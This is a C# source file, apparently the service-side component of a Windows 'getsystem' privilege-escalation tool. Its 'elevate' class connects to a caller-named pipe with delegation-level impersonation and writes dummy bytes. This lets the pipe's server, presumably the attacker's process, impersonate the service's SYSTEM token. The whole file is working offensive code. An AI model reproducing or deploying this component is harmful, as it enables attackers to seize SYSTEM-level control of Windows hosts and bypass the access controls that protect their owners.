using System;
using System.Collections.Generic;
using System.Text;

namespace getsystem_service
{
    public class elevate
    {
        public elevate()
        {

        }

        public void start(string pipe)
        {
            System.IO.Pipes.NamedPipeClientStream client = new System.IO.Pipes.NamedPipeClientStream(".", pipe, System.IO.Pipes.PipeDirection.Out, System.IO.Pipes.PipeOptions.None, System.Security.Principal.TokenImpersonationLevel.Delegation);
            client.Connect();

            // Write some data (doesn't matter what)
            client.Write(new byte[] { 0x40, 0x5f, 0x78, 0x70, 0x6e, 0x5f }, 0, 6);
        }
    }
}